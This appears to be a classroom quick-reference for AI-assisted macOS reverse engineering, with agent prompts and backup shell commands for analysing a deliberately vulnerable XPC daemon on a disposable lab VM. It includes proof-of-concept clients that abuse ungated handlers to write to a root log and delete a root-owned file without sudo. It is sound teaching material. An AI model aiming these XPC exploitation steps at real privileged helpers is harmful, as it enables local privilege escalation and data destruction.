# AI-assisted reversing — quick reference

Paste **agent prompts** below into Cursor or Claude Code. Shell under [Plan-B](#plan-b-raw-shell-commands) is backup only.

Full setup (do in order): **[STUDENT_GUIDE.md — Session 0](STUDENT_GUIDE.md#session-0--lab-setup-do-these-steps-in-order)** · worksheet: [case-studies/tutorial-daemon-planted.md](case-studies/tutorial-daemon-planted.md)

**Chapter 8 refresh:** [ch08-xpc/STUDENT_GUIDE.md](../ch08-xpc/STUDENT_GUIDE.md) Sessions A–D.

---

## Session success criteria (what "done" looks like)

| Step | You are done when… |
|------|-------------------|
| 1–2 | VM up; `ssh lab-mac` works (`arm64`) |
| 3–6 | `setup-keep.sh` done; smoke `--live` OK; `sudo -n` OK; IDE restarted |
| 7–8 | Project clone; **you** filled `LAB_SAFETY.md` + `machines.md` |
| **9** | **Orientation → `READY FOR PASS`** (no intake) |
| C | Dossier exists; CORPUS has two MachServices + entitlement; `targets/` synced to lab host |
| D | Wrong-door + listener dump + client-validation TSVs; InternalHandler decomps noted |
| E | C-001–C-003 escalated; C-004 closed with signature rationale |
| F | Daemon running; lldb transcript hash-pinned A-001 / A-002; client `reply: ok=1` |
| G | C-001/C-003 confirmed; INDEX rendered; HANDOFF points at H / H+ |
| H | `/tmp/unprivileged-write` without sudo; log line + SCRIPTORIUM A-003 |
| H+ | Sentinel not deletable by user, then gone after chain client; A-004; tear-down in VM_ACTIONS |

---

## All code paths in this chapter

| Topic | Directory | What it is |
|-------|-----------|------------|
| **Station home** (one per workstation) | `~/tools/mac-reversing-station/` (or any name) | Cloned from `mac-reversing-station`. Runs `setup-keep.sh`, owns `Skills/`, `scripts/`, `ghidra-scripts/`, `templates/` |
| **Per-target project clone** (one per target) | `~/re/tutorial-daemon-class/` | Separate clone of the same repo, scoped to one investigation. Holds `LAB_SAFETY.md`, `CORPUS.md`, `findings/`, `artifacts/`, `pocs/` |
| **Planted daemon source** | station: `templates/tutorial-target/` | `bin/tutorial_daemon`, `src/tutorial_daemon.m`, `plists/com.tutorial.daemon.privileged.plist`, `src/entitlements.plist`, `build.sh` |
| **Lab stub** (this repo) | [`labs/ai-re/`](../../../labs/ai-re/) | README only — explains the two-clone convention and points at the station |

Both targets ship in the station repo — no Drive download required. See [README.md — Lab artifacts](README.md) for the path table.

### Pre-built lab binaries (no compile for class)

| Target | Path | Compile? |
|--------|------|----------|
| Planted daemon | `templates/tutorial-target/bin/tutorial_daemon` | **No** — use after `git clone` |
| Lab II bundle | `templates/tutorial-target-2/PluginHost.app` | **No** |

Rebuild only if you changed source, need **Intel (x86_64)**, or the binary is missing: `cd templates/tutorial-target && ./build.sh` or `cd templates/tutorial-target-2 && ./build.sh` (needs `clang` + `codesign`). **PoC clients** for Sessions F / H / H+ are compiled in your project clone under `pocs/` — see [Plan-B: Session F client](#plan-b-session-f-client-privileged-port-lldb-trigger).

---

## Mach names & labels (defaults in repo)

| Lab | Mach service / Label | Plist filename (after install) |
|-----|----------------------|--------------------------------|
| Planted daemon (primary) | `com.tutorial.daemon.privileged` | `com.tutorial.daemon.privileged.plist` |
| Planted daemon (secondary, same plist) | `com.tutorial.daemon.internal` | (declared in the same plist's `MachServices` dict) |

If a lab fails with **connection invalid**, the name in **source**, **plist**, and **`launchctl print`** must match **exactly**.

**Unprivileged PoC / chain:** prefer `com.tutorial.daemon.internal` with `options:0`. Session F confirmation may use the privileged name with `sudo`.

---

## Triage state cheatsheet

`hypothesis` → `scan-hit` → `hold` / `blocked` → `escalated` → `reproducing` → `confirmed` → `report-ready` → `reported` → `closed`

- **No `interesting` state.** Promote or close-with-rationale.
- **`closed` requires `--reason`.**
- **Severity:** `info, low, medium, high, critical` (not `informational`).
- **`--vuln-class`** (not `--class`) on `triage.py create`.
- **`--primary-artifact`** is **required** on `create`.

---

## Lab setup (human — before any prompt below)

Do [STUDENT_GUIDE.md Session 0](STUDENT_GUIDE.md#session-0--lab-setup-do-these-steps-in-order) Steps 1–8 first.

**SSH config** (`~/.ssh/config` on your Mac — change IP and username):

```
Host lab-mac
  HostName 192.168.64.2
  User student
  ServerAliveInterval 30
```

**Setup script** (from `~/tools/mac-reversing-station/`):

```bash
scripts/setup-keep.sh \
  --host lab-mac \
  --remote-home /Users/student \
  --vm-password 'YOUR_VM_PASSWORD' \
  --lab-disposable \
  --live-smoke
```

Agent work happens only in `~/re/tutorial-daemon-class/`.

---

## Agent prompts by session

---

### 0.7 — Orientation (first agent prompt)

Paste this **once** with `~/re/tutorial-daemon-class/` as the workspace. Do **not** start reversing until you see **ready for pass**.

```
Orientation only — do not run intake, install the planted daemon, open Ghidra on tutorial_daemon, or edit LAB_SAFETY.md / machines.md.

1) Read and summarize (8–12 bullets total):
   - LAB_SAFETY.md — list any still-blank required fields (if blank, blocker)
   - machines.md — primary lab alias, OS build, SIP, allowed tests
   - CORPUS.md, INDEX.md, SCRIPTORIUM.md (initial empty state is OK)
   - HANDOFF.md if present
   - Station repo README at ~/tools/mac-reversing-station/README.md section "How it works" (read via cat or your file tools)

2) Connectivity — run and show output:
   - ssh -o BatchMode=yes $MACRE_MACHINE 'uname -m; sw_vers -productVersion; csrutil status'
   - Confirm ghidra-mcp and macre-vm-mcp appear in MCP tool list
   - From station home ~/tools/mac-reversing-station: MACRE_MACHINE=$MACRE_MACHINE bash scripts/smoke-wave3.sh --live

3) Confirm MACRE_MACHINE and MACRE_REMOTE_TARGETS match machines.md and that targets/ will sync to the lab host path in REMOTE_TARGETS.

4) State explicitly: workstation path (this project clone) vs station home vs lab host — which runs Ghidra?

5) End with exactly one line: READY FOR PASS — or BLOCKED: <numbered list>.

Do not invent LAB_SAFETY values. Do not call start-target.py yet.
```

**After `ready for pass`:** proceed to Session C below.

---

### Session C — start pass / intake

**Prerequisite:** Session 0 Step 9 returned `READY FOR PASS`.

```
Start a pass on templates/tutorial-target/bin/tutorial_daemon as PASS-CLASS-001. Use the bundle-intake skill. Read LAB_SAFETY.md first and confirm dynamic work is allowed. Show me the dossier path when intake completes.
```

```
Read the PASS-CLASS-001 dossier and summarize family_labels, surfaces, os_component.mach_services, and the bundle block. What could intake not see from a bare LaunchDaemon Mach-O?
```

```
Use the cli-static skill to read MachServices from templates/tutorial-target/plists/com.tutorial.daemon.privileged.plist and entitlements from templates/tutorial-target/bin/tutorial_daemon. Note them in CORPUS.md under tutorial-daemon.
```

```
Sync the tutorial-daemon target to the lab host using rsync-to-vm.sh. Record the path mapping in CORPUS.md.
```

```
What recipes and Ghidra scripts did intake recommend for PASS-CLASS-001? If the list is empty, recommend scan_wrong_door.py and scan_xpc_client_validation.py given two MachServices in the plist.
```

### Session D — static

*Chapter 8 parallel: Session D attack checklist — listener identity, SecTask\*, sensitive RPC without gate.*

```
Open the tutorial-daemon target in Ghidra via program_open against the lab host path in CORPUS.md. Report session id and language id when done.
```

```
Run scan_wrong_door.py against the open tutorial-daemon session. Save the TSV under findings/analysis/. Summarize tier-A rows.
```

```
Run dump_xpc_listeners.py. List verified listeners and whether the delegate branches on listener identity.
```

```
Run scan_xpc_client_validation.py. Decompile authorizeMethodID:connection: and report what gates each methodID.
```

```
Decompile -[InternalHandler writeAuditLog:withReply:] and -[InternalHandler resetCacheAtPath:withReply:]. Do they validate the caller? What file operations do they perform? Record addresses for lldb.
```

### Session E — triage

```
Create candidate C-001: Shared delegate no listener-identity branching, wrong-door, high, wrong-door TSV. Transition to escalated.
```

```
Create candidate C-002: authorizeMethodID returns YES for methodID 0, authorization-bypass, high, xpc-client-validation TSV. Transition to escalated.
```

```
Create candidate C-003: InternalHandler ungated — writeAuditLog appends to root log path; resetCacheAtPath deletes arbitrary path as root, un-gated-write, critical, xpc-client-validation TSV. Transition to escalated. Note chain path C-001 + C-003 via resetCacheAtPath.
```

```
Verify the daemon is ad-hoc signed. Create C-004 as info red herring on the dossier, then close with rationale: private TCC entitlements ignored on non-Apple signatures.
```

### Session F — lldb confirm

```
Install the planted daemon on the lab host: scp binary and plist, sudo install to /Library/PrivilegedHelperTools and /Library/LaunchDaemons, launchctl bootstrap, verify running. Append rollback to VM_ACTIONS.md.
```

```
Use poc-authoring to scaffold pocs/client/client.m: connect com.tutorial.daemon.privileged with NSXPCConnectionPrivileged, InternalOps, writeAuditLog probe. Build, sign, scp to /tmp/client. Do not run yet.
```

```
Use lldb_run_anchors on tutorial_daemon on the lab host. Break on -[DaemonDelegate listener:shouldAcceptNewConnection:]. Save transcript to artifacts/PASS-CLASS-001-tutorial-daemon-shouldAccept.log. Tell me when waiting.
```

```
Run sudo /tmp/client on the lab host. Show client stdout and the lldb hit snippet.
```

```
Hash the transcript. Add SCRIPTORIUM anchors A-001 (C-001 wrong-door) and A-002 (C-003 writeAuditLog via wrong door).
```

### Session G — closure

```
Transition C-001 and C-003 escalated → reproducing → confirmed. Run triage render. Summarize final states for C-001 through C-004.
```

```
Draft HANDOFF.md for PASS-CLASS-001: LKGS, Active Findings, Next Session Start = Session H then H+. Show draft before writing.
```

### Session H — unprivileged PoC

```
Use poc-authoring: pocs/unprivileged-write/client.m → com.tutorial.daemon.internal options 0, writeAuditLog unprivileged probe. Build, scp /tmp/unprivileged-write. Do not run.
```

```
Run /tmp/unprivileged-write on the lab host without sudo. tail -1 /var/log/tutorial-daemon-audit.log. Hash output as SCRIPTORIUM A-003.
```

### Session H+ — chain delete

```
On the lab host create /tmp/tutorial-chain-sentinel root-owned; verify lab user cannot rm it. Log in VM_ACTIONS.md.
```

```
Use poc-authoring: pocs/chain-delete/client.m → com.tutorial.daemon.internal, resetCacheAtPath on the sentinel. scp /tmp/chain-delete. Do not run.
```

```
Run /tmp/chain-delete without sudo. Verify sentinel gone. Hash log as SCRIPTORIUM A-004.
```

```
Tear down planted daemon on lab host; remove /tmp clients; complete VM_ACTIONS.md rollback.
```

---

## Lab II — multi-binary bundle (separate spine)

[`LAB_II.md`](LAB_II.md) — `PluginHost.app` under `templates/tutorial-target-2/`. Plan ~45–60 min. Do not mix `C-101`…`C-103` into the in-class daemon pass.

---

## One-line reminders

- **Same bugs as Chapter 8, different workflow:** wrong door + missing auth on XPC handler — station adds dossier, scans, triage, evidence ledger.
- **Two machines, one agent.** Workstation thinks. Lab host executes.
- **One pass = one target.** Project clone under `~/re/<name>/`. Never intake from station home.
- **Agent first; Plan-B if stuck.** You are learning the agent workflow, not memorizing shell one-liners.
- **Tier A first.** Decompiled callsite + literal arg → lldb-ready.
- **Chain primitive today:** `resetCacheAtPath:` (root delete), not `installConfigAtPath:`.
- **Hash-pin artifacts** in `SCRIPTORIUM.md`.

---

## Plan-B: raw shell commands

Use only when the agent stalls or for instructor demo. **Session 0 Steps 1–8 are human-only.**

### Plan-B: Install (Session 0.3)

```bash
git clone https://github.com/UnsaltedHash42/mac-reversing-station ~/tools/mac-reversing-station
cd ~/tools/mac-reversing-station
scripts/setup-keep.sh --host <lab-host> --remote-home /Users/<remote-user>
# Restart agent. Then:
bash scripts/smoke-wave3.sh
MACRE_MACHINE=<lab-host> bash scripts/smoke-wave3.sh --live
export MACRE_MACHINE=<lab-host>
export MACRE_REMOTE_TARGETS=/Users/<remote-user>/Targets
```

### Per-target project + intake (Session C)

```bash
mkdir -p ~/re && cd ~/re
git clone https://github.com/UnsaltedHash42/mac-reversing-station tutorial-daemon-class
cd tutorial-daemon-class
scripts/init-project.sh --name tutorial-daemon-class
$EDITOR LAB_SAFETY.md machines.md

python3 scripts/start-target.py templates/tutorial-target/bin/tutorial_daemon \
    --pass-id PASS-CLASS-001

MACRE_MACHINE=<lab-host> MACRE_REMOTE_TARGETS=/Users/<remote-user>/Targets \
    scripts/rsync-to-vm.sh --record tutorial-daemon targets/
```

### Plan-B: triage and closure (Session E / G)

```bash
scripts/triage.py create --id C-001 --pass-id PASS-CLASS-001 --target tutorial-daemon \
    --title "Shared delegate, no listener-identity branching" \
    --vuln-class wrong-door --severity high \
    --primary-artifact findings/analysis/PASS-CLASS-001-tutorial-daemon-wrong-door.tsv
scripts/triage.py transition C-001 escalated

scripts/triage.py create --id C-002 --pass-id PASS-CLASS-001 --target tutorial-daemon \
    --title "authorizeMethodID:connection: returns YES for methodID 0" \
    --vuln-class authorization-bypass --severity high \
    --primary-artifact findings/analysis/PASS-CLASS-001-tutorial-daemon-xpc-client-validation.tsv
scripts/triage.py transition C-002 escalated

scripts/triage.py create --id C-003 --pass-id PASS-CLASS-001 --target tutorial-daemon \
    --title "InternalHandler ungated — writeAuditLog + resetCacheAtPath as root" \
    --vuln-class un-gated-write --severity critical \
    --primary-artifact findings/analysis/PASS-CLASS-001-tutorial-daemon-xpc-client-validation.tsv
scripts/triage.py transition C-003 escalated

scripts/triage.py create --id C-004 --pass-id PASS-CLASS-001 --target tutorial-daemon \
    --title "com.apple.private.tcc.allow entitlement (red herring)" \
    --vuln-class authorization-bypass --severity info \
    --primary-artifact findings/analysis/PASS-CLASS-001-tutorial-daemon-dossier.json
scripts/triage.py transition C-004 closed \
    --reason "Apple-private TCC entitlements honored only for Apple-platform-signed binaries; ad-hoc signed."

scripts/triage.py transition C-001 reproducing && scripts/triage.py transition C-001 confirmed
scripts/triage.py transition C-003 reproducing && scripts/triage.py transition C-003 confirmed
scripts/triage.py render
```

### Session F install (lab host)

```bash
scp templates/tutorial-target/bin/tutorial_daemon \
    <lab-host>:/tmp/tutorial_daemon
scp templates/tutorial-target/plists/com.tutorial.daemon.privileged.plist \
    <lab-host>:/tmp/com.tutorial.daemon.privileged.plist

ssh <lab-host> 'sudo install -m 755 -o root -g wheel /tmp/tutorial_daemon /Library/PrivilegedHelperTools/tutorial_daemon'
ssh <lab-host> 'sudo install -m 644 -o root -g wheel /tmp/com.tutorial.daemon.privileged.plist /Library/LaunchDaemons/com.tutorial.daemon.privileged.plist'
ssh <lab-host> 'sudo launchctl bootstrap system /Library/LaunchDaemons/com.tutorial.daemon.privileged.plist'
ssh <lab-host> 'launchctl print system/com.tutorial.daemon.privileged | grep -E "state|pid|program"'
```

Rollback (append to `VM_ACTIONS.md`):

```bash
ssh <lab-host> 'sudo launchctl bootout system /Library/LaunchDaemons/com.tutorial.daemon.privileged.plist'
ssh <lab-host> 'sudo rm /Library/LaunchDaemons/com.tutorial.daemon.privileged.plist'
ssh <lab-host> 'sudo rm /Library/PrivilegedHelperTools/tutorial_daemon'
```

### Plan-B: Session F client (privileged port, lldb trigger)

```bash
mkdir -p pocs/client && cd pocs/client
cat > client.m <<'EOF'
#import <Foundation/Foundation.h>
@protocol InternalOps <NSObject>
- (void)writeAuditLog:(NSString *)message withReply:(void (^)(BOOL))reply;
@end
int main(void) {
    @autoreleasepool {
        NSXPCConnection *conn = [[NSXPCConnection alloc]
            initWithMachServiceName:@"com.tutorial.daemon.privileged"
                            options:NSXPCConnectionPrivileged];
        conn.remoteObjectInterface =
            [NSXPCInterface interfaceWithProtocol:@protocol(InternalOps)];
        [conn resume];
        id proxy = [conn remoteObjectProxyWithErrorHandler:^(NSError *err) {
            NSLog(@"error: %@", err); exit(1);
        }];
        [proxy writeAuditLog:@"INJECTED FROM PRIVILEGED PORT NAME"
                   withReply:^(BOOL ok) { NSLog(@"reply: ok=%d", ok); exit(0); }];
        [[NSRunLoop currentRunLoop] run];
    }
}
EOF
clang -framework Foundation -fobjc-arc -arch arm64 client.m -o client
codesign --force --sign - --options runtime client
scp client <lab-host>:/tmp/client
ssh <lab-host> 'sudo /tmp/client'
```

### Plan-B: Session H / H+ clients (internal port, no sudo)

Internal-port `writeAuditLog` and `resetCacheAtPath` clients: ask the agent to scaffold per Session H / H+ prompts above, or mirror the Session F template with `com.tutorial.daemon.internal` and `options:0`, adding `resetCacheAtPath:withReply:` for H+.

```bash
ssh <lab-host> '/tmp/unprivileged-write'
ssh <lab-host> '/tmp/chain-delete'
ssh <lab-host> 'test ! -f /tmp/tutorial-chain-sentinel && echo sentinel-gone'
```

### Tear-down (end of class)

```bash
ssh <lab-host> 'sudo launchctl bootout system /Library/LaunchDaemons/com.tutorial.daemon.privileged.plist'
ssh <lab-host> 'sudo rm /Library/LaunchDaemons/com.tutorial.daemon.privileged.plist /Library/PrivilegedHelperTools/tutorial_daemon'
ssh <lab-host> 'rm -f /tmp/client /tmp/unprivileged-write /tmp/chain-delete /tmp/tutorial_daemon /tmp/com.tutorial.daemon.privileged.plist'
```
